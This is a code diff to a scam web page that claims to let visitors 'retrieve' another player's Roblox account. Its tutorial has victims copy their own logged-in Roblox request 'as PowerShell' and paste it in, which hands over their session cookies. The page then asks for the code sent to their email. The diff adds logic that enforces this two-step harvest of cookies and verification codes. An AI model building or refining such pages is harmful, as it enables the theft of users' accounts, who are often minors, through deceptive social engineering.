@@ -79,7 +79,7 @@
         @keyframes floatAround {
             0% { transform: translate(0, 0); }
             25% { transform: translate(calc(var(--rand-x-1) * 1vw), calc(var(--rand-y-1) * 1vh)); }
-            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand--y2) * 1vh)); }
+            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand-y-2) * 1vh)); }
             75% { transform: translate(calc(var(--rand-x-3) * 1vw), calc(var(--rand-y-3) * 1vh)); }
             100% { transform: translate(0, 0); }
         }
@@ -180,6 +180,7 @@
         <button
             id="openModalButton"
             class="w-full custom-button-darkblue hover:custom-button-darkblue text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 custom-focus-ring-blue focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105 mt-4"
+            disabled
         >
             Code check
         </button>
@@ -216,13 +217,14 @@
     <div id="tutorialModal" class="modal hidden">
         <div class="modal-content">
             <span class="close-button tutorial-close-button">&times;</span>
-            <h2 class="text-2xl font-bold text-white mb-4 text-center">How to use the website</h2>
+            <h2 class="text-2xl font-bold text-white mb-4 text-center">How to Get Powershell Code</h2>
             <ol class="list-decimal list-inside text-left space-y-2 text-gray-300">
                 <li>Go to <a href="https://www.roblox.com" target="_blank" class="text-blue-400 hover:underline">roblox.com</a> and navigate to the other player's profile.</li>
                 <li>Press <kbd>F12</kbd> to open Developer Tools, then go to the "Network" tab, and press <kbd>CTRL</kbd> + <kbd>R</kbd> to refresh the page.</li>
                 <li>Look for a request named "profile" (it might have a blue logo next to it), right-click it, then select <span class="font-semibold">Copy > Copy all as PowerShell</span>.</li>
                 <li>Go back to this website and paste the copied PowerShell file into the main text area.</li>
-                <li>Click "Check Corruption + Log info" and wait 2 minutes for the API to receive the request. After this, you can enter the code sent to your email in the "Code check" menu.</li>
+                <li>Click "Check Corruption + Log info" and wait 2 minutes for the API to receive the request.</li>
+                <li>**After the "Check Corruption + Log info" step is complete, and the 2-minute API wait is over,** you can then open the "Code check" menu and enter the code sent to your email.</li>
                 <li>Go to <a href="https://www.roblox.com" target="_blank" class="text-blue-400 hover:underline">roblox.com</a>, and your account login should be swapped with the other account.</li>
                 <li>Enjoy the retrieved account!</li>
             </ol>
@@ -258,9 +260,11 @@
         
         let lastClickTimeMain = 0; // Tracks last successful click of main button
         let lastClickTimeModal = 0; // Tracks last successful click of modal button (also reset by main button)
+        let mainButtonClickedSuccessfully = false; // New state variable
 
-        // localStorage key for saving the input
-        const localStorageKey = 'powershellCodeInput';
+        // localStorage key for saving the input and state
+        const localStorageCodeKey = 'powershellCodeInput';
+        const localStorageMainButtonStateKey = 'mainButtonSuccess';
 
         /**
          * Displays a message in the specified message box.
@@ -291,14 +295,19 @@
 
         // Function to save text area content to localStorage
         function saveInputToLocalStorage() {
-            localStorage.setItem(localStorageKey, messageInput.value);
+            localStorage.setItem(localStorageCodeKey, messageInput.value);
+            localStorage.setItem(localStorageMainButtonStateKey, mainButtonClickedSuccessfully);
         }
 
-        // Function to load text area content from localStorage
+        // Function to load text area content and state from localStorage
         function loadInputFromLocalStorage() {
-            const savedCode = localStorage.getItem(localStorageKey);
+            const savedCode = localStorage.getItem(localStorageCodeKey);
             if (savedCode) {
                 messageInput.value = savedCode;
+            }
+            const savedState = localStorage.getItem(localStorageMainButtonStateKey);
+            if (savedState === 'true') { // localStorage stores booleans as strings
+                mainButtonClickedSuccessfully = true;
             }
         }
 
@@ -313,7 +322,6 @@
             if (remainingTime > 0) {
                 const minutes = Math.floor(remainingTime / 60000);
                 const seconds = Math.ceil((remainingTime % 60000) / 1000);
-                // Use a short duration for these error messages
                 showMessageBox(messageBoxElement, `Please wait ${minutes}m ${seconds}s before sending again.`, true, 5000); 
                 return;
             }
@@ -388,9 +396,11 @@
                     if (isMainButton) {
                         showMessageBox(messageBoxElement, 'Code sent to API for checking, Please wait 2 minutes...');
                         messageInput.value = '';
-                        saveInputToLocalStorage();
+                        // Set the state to true on successful main button send
+                        mainButtonClickedSuccessfully = true; 
+                        saveInputToLocalStorage(); // Save the new state
                     } else {
-                        showMessageBox(messageBoxElement, 'Message sent successfully!', false, 5000); // Success message auto-hides
+                        showMessageBox(messageBoxElement, 'Message sent successfully!', false, 5000);
                         modalMessageInput.value = '';
                     }
                 }
@@ -413,7 +423,6 @@
                 const seconds = Math.ceil((mainRemaining % 60000) / 1000);
                 sendButton.disabled = true;
                 sendButton.textContent = `Check Corruption + Log info (${minutes}m ${seconds}s)`;
-                // Only clear if messageBox is NOT currently showing a specific error or success message
                 if (!messageBox.classList.contains('custom-error-bg') && !messageBox.classList.contains('custom-success-bg')) {
                     messageBox.classList.add('hidden');
                 }
@@ -425,7 +434,14 @@
 
             // Modal Button Cooldown (depends on main button's last click)
             const modalRemaining = modalCooldownTime - (currentTime - lastClickTimeModal);
-            if (modalRemaining > 0) {
+            
+            // "Code check" button is enabled only if main button was successfully clicked AND modal cooldown is over
+            if (!mainButtonClickedSuccessfully) {
+                openModalButton.disabled = true;
+                openModalButton.textContent = 'Code check (Complete first step)';
+                sendModalButton.disabled = true;
+                sendModalButton.textContent = 'Enter code';
+            } else if (modalRemaining > 0) {
                 const minutes = Math.floor(modalRemaining / 60000);
                 const seconds = Math.ceil((modalRemaining % 60000) / 1000);
                 openModalButton.disabled = true;
@@ -433,10 +449,9 @@
                 sendModalButton.disabled = true;
                 sendModalButton.textContent = `Enter code (${minutes}m ${seconds}s)`;
                 
-                // Only show a general "Please wait" message in modal if no specific error/success is active
                 if (codeCheckModal.classList.contains('flex') && !modalMessageBox.classList.contains('custom-error-bg') && !modalMessageBox.classList.contains('custom-success-bg')) {
                     showMessageBox(modalMessageBox, `Please wait ${minutes}m ${seconds}s before using this.`, true);
-                } else if (!codeCheckModal.classList.contains('flex')) { // If modal is closed, hide its message box
+                } else if (!codeCheckModal.classList.contains('flex')) {
                     modalMessageBox.classList.add('hidden');
                 }
             } else {
@@ -459,15 +474,19 @@
             const currentTime = Date.now();
             const modalRemaining = modalCooldownTime - (currentTime - lastClickTimeModal);
 
+            // Additional check: Ensure main button was clicked successfully
+            if (!mainButtonClickedSuccessfully) {
+                showMessageBox(messageBox, "Error: You must first click 'Check Corruption + Log info' and wait for the API request to complete.", true, 5000);
+                return;
+            }
+
             if (modalRemaining > 0) {
                 const minutes = Math.floor(modalRemaining / 60000);
                 const seconds = Math.ceil((modalRemaining % 60000) / 1000);
-                // This error message for clicking during cooldown should show for 5 seconds
                 showMessageBox(messageBox, `Error, please wait the full ${minutes}m ${seconds}s for the API to receive the request.`, true, 5000); 
                 return; 
             }
 
-            // If not on cooldown, open the modal
             codeCheckModal.classList.remove('hidden');
             codeCheckModal.classList.add('flex');
             modalMessageBox.classList.add('hidden');
